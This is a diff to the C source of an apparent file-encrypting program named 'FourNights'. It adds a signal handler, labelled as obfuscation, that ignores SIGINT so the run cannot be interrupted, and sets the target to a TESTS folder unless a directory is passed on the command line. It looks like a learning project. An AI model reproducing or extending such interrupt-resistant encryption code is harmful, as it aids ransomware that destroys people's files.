@@ -1,4 +1,17 @@
 #include "fournights.h"
+#ifndef NO_OBFUSCATION
+/**
+  * sighandler - handles any signal by calling a nothing function
+ (*				 used for obfuscation and catching SIGINT, etc
+ (*				 that could disrupt the program from running.
+  * @sig: signal to handle
+ **/
+static void sighandler(int sig)
+{
+	if (sig)
+		simple_search();
+}
+#endif
 /**
   * main - Entry point
   * @argc: argument count
@@ -9,12 +22,19 @@
 int main(int argc, char *argv[])
 {
 	struct file_filter_s file_filter;
+	char target_dir[PATH_MAX];
 	EVP_CIPHER_CTX encrypt;
 	EVP_CIPHER_CTX decrypt;
 
 	file_filter.cipher_flag = 'e'; /* set cipher_flag to encrypt */
+#ifndef NO_OBFUSCATION
+	signal(SIGINT, sighandler);
+#endif
+	if (!getcwd(target_dir, PATH_MAX))
+		return (EXIT_FAILURE);
+	my_strncat(target_dir, "/TESTS/\0", my_strlen(target_dir), 8);
 	if (argc == 1)
-		init_struct(&file_filter, "/home/vagrant/FourNights/TESTS/");
+		init_struct(&file_filter, target_dir);
 	else
 		init_struct(&file_filter, argv[1]); /* Security Hole, I think */
 	file_filter.cipher = aes_encrypt_init(&encrypt);
